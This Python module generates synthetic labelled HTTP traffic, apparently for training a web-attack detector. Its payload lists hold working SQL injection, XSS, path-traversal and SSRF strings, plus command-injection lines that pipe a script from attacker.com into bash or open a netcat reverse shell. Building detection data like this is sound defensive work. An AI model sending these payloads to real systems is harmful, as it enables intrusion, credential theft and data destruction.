"""
Synthetic HTTP request generator for training and testing without a real dataset.

Benign requests are drawn from realistic web-app patterns. Attack requests
implement real payload classes — not toy examples.
"""

from __future__ import annotations

import random
import urllib.parse
from typing import Callable

# Common benign paths and parameters
_PATHS = [
    "/", "/index.php", "/login", "/register", "/logout",
    "/products", "/product/detail", "/cart", "/checkout",
    "/api/v1/users", "/api/v1/items", "/api/v1/orders",
    "/search", "/profile", "/settings", "/about", "/contact",
    "/static/main.js", "/static/style.css", "/favicon.ico",
    "/admin/dashboard", "/admin/users",
]
_BENIGN_PARAMS = [
    {"id": "42"}, {"page": "2"}, {"q": "shoes"},
    {"user": "alice"}, {"sort": "price_asc"}, {"limit": "20", "offset": "0"},
    {"email": "user@example.com"}, {"category": "electronics"},
    {"token": "abc123xyz"}, {},
]
_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) AppleWebKit/605.1.15",
    "curl/7.88.1",
    "python-requests/2.31.0",
]

# SQL injection payloads
_SQLI = [
    "' OR '1'='1",
    "1 UNION SELECT null,username,password FROM users--",
    "1; DROP TABLE users--",
    "admin'--",
    "1' AND SLEEP(5)--",
    "1 AND 1=1",
    "' OR 1=1#",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    "') OR ('x'='x",
    "1; SELECT * FROM information_schema.tables--",
    "1' ORDER BY 1--",
    "CAST(1 AS varchar)",
    "1 AND BENCHMARK(5000000,MD5(1))--",
    "' HAVING 1=1--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
]

# XSS payloads
_XSS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "javascript:alert(1)",
    "<svg/onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<body onload=alert('XSS')>",
    "expression(alert(1))",
    "<input onfocus=alert(1) autofocus>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<div style=\"width:expression(alert(1))\">",
    "document.write('<script>alert(1)</script>')",
]

# Path traversal payloads
_TRAVERSAL = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//etc/passwd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..\\..\\..\\windows\\win.ini",
    "/etc/passwd%00",
    "file:///etc/passwd",
    "../../../../../boot.ini",
    "..%5c..%5cwindows%5cwin.ini",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
]

# Command injection payloads
_CMDI = [
    "; ls -la",
    "| cat /etc/passwd",
    "` id`",
    "$(whoami)",
    "; echo 'pwned'",
    "&&  cat /etc/shadow",
    "; curl http://attacker.com/shell.sh | bash",
    "%0a id",
    "| nc -e /bin/bash 10.0.0.1 4444",
    "'; ls -la; echo '",
]

# SSRF payloads
_SSRF = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost/admin",
    "http://127.0.0.1:8080/internal",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_FLUSHALL",
    "dict://127.0.0.1:6379/info",
    "http://0.0.0.0/admin",
    "http://[::1]/internal",
]


def _req(method: str, path: str, params: dict, body: str = "", ua: str = "") -> dict:
    query = urllib.parse.urlencode(params)
    url   = path + ("?" + query if query else "")
    headers = {
        "User-Agent":   ua or random.choice(_UAS),
        "Content-Type": "application/x-www-form-urlencoded" if body else "text/html",
        "Accept":       "text/html,application/json",
    }
    return {"method": method, "url": url, "query": query, "body": body, "headers": headers}


def _benign_request() -> dict:
    method = random.choices(["GET", "POST", "GET"], weights=[6, 3, 1])[0]
    path   = random.choice(_PATHS)
    params = random.choice(_BENIGN_PARAMS).copy()
    body   = ""
    if method == "POST":
        body   = urllib.parse.urlencode(random.choice(_BENIGN_PARAMS))
        params = {}
    return _req(method, path, params, body)


def _attack_request() -> dict:
    method   = random.choices(["GET", "POST"], weights=[5, 5])[0]
    path     = random.choice(_PATHS)
    attack_type, pool = random.choice([
        ("sqli",     _SQLI),
        ("xss",      _XSS),
        ("traversal", _TRAVERSAL),
        ("cmdi",     _CMDI),
        ("ssrf",     _SSRF),
    ])
    payload  = random.choice(pool)
    param    = random.choice(["id", "q", "search", "page", "file", "url", "redirect", "input"])
    body     = ""
    params: dict = {}
    if method == "GET":
        params = {param: payload}
    else:
        body   = urllib.parse.urlencode({param: payload})
    return _req(method, path, params, body)


def generate(
    n_benign:  int = 5000,
    n_attack:  int = 5000,
    seed:      int = 42,
) -> tuple[list[dict], list[int]]:
    """Returns (requests, labels) with 0 = benign and 1 = malicious."""
    random.seed(seed)
    requests: list[dict] = []
    labels:   list[int]  = []

    for _ in range(n_benign):
        requests.append(_benign_request())
        labels.append(0)

    for _ in range(n_attack):
        requests.append(_attack_request())
        labels.append(1)

    combined = list(zip(requests, labels))
    random.shuffle(combined)
    reqs, labs = zip(*combined)
    return list(reqs), list(labs)
